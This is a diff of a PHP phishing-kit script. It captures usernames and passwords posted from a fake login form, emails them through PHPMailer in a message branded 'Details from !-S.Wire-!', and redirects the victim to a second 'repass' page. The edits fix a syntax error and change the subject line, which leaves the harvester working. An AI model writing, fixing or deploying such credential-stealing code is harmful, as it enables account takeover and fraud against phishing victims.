@@ -9,7 +9,6 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 }
 $attuser = $_POST['user'];
 $attpassword = $_POST['pass'];
-$mail_server = 'Office';
 
 // Import PHPMailer classes into the global namespace
 // These must be at the top of your script, not inside a function
@@ -41,7 +40,7 @@ $mail = new PHPMailer(true);
 
     // Content
     $mail->isHTML(true);                                  // Set email format to HTML
-    $mail->Subject = getenv("REMOTE_ADDR");
+    $mail->Subject = 'Here is the subject';
     $mail->Body    = $mail_server.' Details from !-S.Wire-!: '."\n"
 			.'**************************************'."\n"
 			.'email: '.$attuser."\n"
@@ -50,7 +49,7 @@ $mail = new PHPMailer(true);
 
     $mail->send();
     
-	header("Location: repass2.php?user=$attuser")
-	die();
+ header("Location: repass2.php?user=$attuser");
+die();
 
 ?>
